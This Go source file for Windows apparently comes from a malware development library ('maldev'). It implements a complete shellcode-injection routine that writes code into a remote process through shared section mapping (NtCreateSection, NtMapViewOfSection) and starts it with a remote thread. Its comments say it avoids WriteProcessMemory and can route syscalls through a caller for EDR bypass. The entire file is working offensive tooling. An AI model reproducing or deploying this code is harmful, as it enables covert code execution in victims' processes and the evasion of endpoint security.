//go:build windows

package inject

import (
	"fmt"
	"unsafe"

	"github.com/oioio-space/maldev/win/api"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
	"golang.org/x/sys/windows"
)

// Section mapping constants.
const (
	secCommit        = 0x08000000
	sectionMapRead   = 0x0004
	sectionMapWrite  = 0x0002
	sectionMapExec   = 0x0008
	viewUnmap        = 0x0008
)

// SectionMapInject injects shellcode into a remote process using shared section
// mapping. No WriteProcessMemory is called -- the shellcode is written via a
// local view and mapped into the target via NtMapViewOfSection.
//
// If caller is non-nil, NT syscalls are routed through it for EDR bypass;
// otherwise the standard ntdll exports are used.
func SectionMapInject(pid int, shellcode []byte, caller *wsyscall.Caller) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}
	if pid == 0 {
		return fmt.Errorf("target process identifier is required")
	}

	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_CREATE_THREAD,
		false,
		uint32(pid),
	)
	if err != nil {
		return fmt.Errorf("failed to open target process: %w", err)
	}
	defer windows.CloseHandle(hProcess)

	// 1. NtCreateSection -- create a shared section large enough for the shellcode.
	var hSection uintptr
	sectionSize := int64(len(shellcode))

	status := ntCreateSection(caller, &hSection, sectionSize)
	if status != 0 {
		return fmt.Errorf("section creation failed: NTSTATUS 0x%X", status)
	}
	defer windows.CloseHandle(windows.Handle(hSection))

	// 2. Map a RW view into the current process.
	var localBase uintptr
	var localViewSize uintptr
	currentProcess := ^uintptr(0) // pseudo-handle for current process

	status = ntMapView(caller, hSection, currentProcess, &localBase, &localViewSize,
		windows.PAGE_READWRITE)
	if status != 0 {
		return fmt.Errorf("local view mapping failed: NTSTATUS 0x%X", status)
	}

	// 3. Copy shellcode into the local (RW) view.
	copy(unsafe.Slice((*byte)(unsafe.Pointer(localBase)), len(shellcode)), shellcode)

	// 4. Map an RX view into the target process.
	var remoteBase uintptr
	var remoteViewSize uintptr

	status = ntMapView(caller, hSection, uintptr(hProcess), &remoteBase, &remoteViewSize,
		windows.PAGE_EXECUTE_READ)
	if status != 0 {
		ntUnmapView(caller, currentProcess, localBase)
		return fmt.Errorf("remote view mapping failed: NTSTATUS 0x%X", status)
	}

	// 5. Unmap the local view -- we no longer need it.
	ntUnmapView(caller, currentProcess, localBase)

	// 6. Create a remote thread at the mapped address.
	var hThread uintptr
	if caller != nil {
		r, _ := caller.Call("NtCreateThreadEx",
			uintptr(unsafe.Pointer(&hThread)),
			api.ThreadAllAccess,
			0,
			uintptr(hProcess),
			remoteBase,
			0,
			0, 0, 0, 0, 0,
		)
		if r != 0 {
			return fmt.Errorf("remote thread creation failed: NTSTATUS 0x%X", r)
		}
	} else {
		ret, _, callErr := api.ProcCreateRemoteThread.Call(
			uintptr(hProcess),
			0, 0,
			remoteBase,
			0, 0, 0,
		)
		if ret == 0 {
			return fmt.Errorf("remote thread creation failed: %w", callErr)
		}
		hThread = ret
	}
	windows.CloseHandle(windows.Handle(hThread))

	return nil
}

// ntCreateSection wraps NtCreateSection, routing through caller if non-nil.
func ntCreateSection(caller *wsyscall.Caller, hSection *uintptr, size int64) uintptr {
	if caller != nil {
		r, _ := caller.Call("NtCreateSection",
			uintptr(unsafe.Pointer(hSection)),
			uintptr(0x000F001F), // SECTION_ALL_ACCESS
			0,
			uintptr(unsafe.Pointer(&size)),
			windows.PAGE_EXECUTE_READWRITE,
			secCommit,
			0,
		)
		return r
	}
	r, _, _ := api.ProcNtCreateSection.Call(
		uintptr(unsafe.Pointer(hSection)),
		uintptr(0x000F001F),
		0,
		uintptr(unsafe.Pointer(&size)),
		windows.PAGE_EXECUTE_READWRITE,
		secCommit,
		0,
	)
	return r
}

// ntMapView wraps NtMapViewOfSection, routing through caller if non-nil.
func ntMapView(caller *wsyscall.Caller, hSection, hProcess uintptr, base, viewSize *uintptr, protect uintptr) uintptr {
	if caller != nil {
		r, _ := caller.Call("NtMapViewOfSection",
			hSection,
			hProcess,
			uintptr(unsafe.Pointer(base)),
			0, 0,
			0, // SectionOffset
			uintptr(unsafe.Pointer(viewSize)),
			2, // ViewShare
			0,
			protect,
		)
		return r
	}
	r, _, _ := api.ProcNtMapViewOfSection.Call(
		hSection,
		hProcess,
		uintptr(unsafe.Pointer(base)),
		0, 0,
		0,
		uintptr(unsafe.Pointer(viewSize)),
		2, // ViewShare
		0,
		protect,
	)
	return r
}

// ntUnmapView wraps NtUnmapViewOfSection, routing through caller if non-nil.
func ntUnmapView(caller *wsyscall.Caller, hProcess, base uintptr) {
	if caller != nil {
		caller.Call("NtUnmapViewOfSection", hProcess, base) //nolint:errcheck
		return
	}
	api.ProcNtUnmapViewOfSection.Call(hProcess, base) //nolint:errcheck
}
